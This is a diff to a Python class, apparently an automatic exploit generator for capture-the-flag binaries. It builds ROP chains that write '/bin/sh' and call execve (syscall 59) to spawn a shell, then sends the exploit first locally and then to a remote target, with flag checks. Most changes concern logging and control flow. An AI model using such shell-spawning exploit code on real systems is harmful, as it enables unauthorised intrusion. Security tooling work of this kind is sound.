@@ -130,7 +130,7 @@ class Aegis:
 
                 if not string:
                     self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
-                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
+                    self.against.chain += self.against.rop_chain_call_function(function, [59, writeable, 0, 0])
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0]) 
                 self.against.exploit = self.against.padding + self.against.chain
@@ -178,7 +178,7 @@ class Aegis:
         else:
             self.against.process = self.against.start("")
             self.against.send_exploit()
-            exp.write(self.against.exploit)
+            aegis_log.debug(f"Sent exploit")
             if self.against.verify_flag() == False:
                 ret = p64(self.rop.find_gadget(["ret"])[0])
                 chain_len = len(self.against.chain)
@@ -187,13 +187,24 @@ class Aegis:
                 self.against.process = self.against.start("")
 
                 self.against.send_exploit()
-                if self.against.verify_flag() == False:
+                #exp.write(self.against.exploit)
+
+                aegis_log.debug(f"Sent exploit")
+                self.against.verify_flag()# == False:
+                if self.against.flag != None:
+                    aegis_log.debug(f"Sending exploit to remote")
                     self.against.process = self.against.start("REMOTE")
                     self.against.send_exploit()
                     
+                    self.against.verify_flag()
+                    aegis_log.debug(f"Sent exploit to remote")
             else:
+                exp.write(self.against.exploit)
                 self.against.process = self.against.start("REMOTE")
+                aegis_log.debug(f"Sending exploit to remote")
                 self.against.send_exploit()
+                self.against.verify_flag()
+                aegis_log.debug(f"Sent exploit to remote")
  
 def print_title():
 
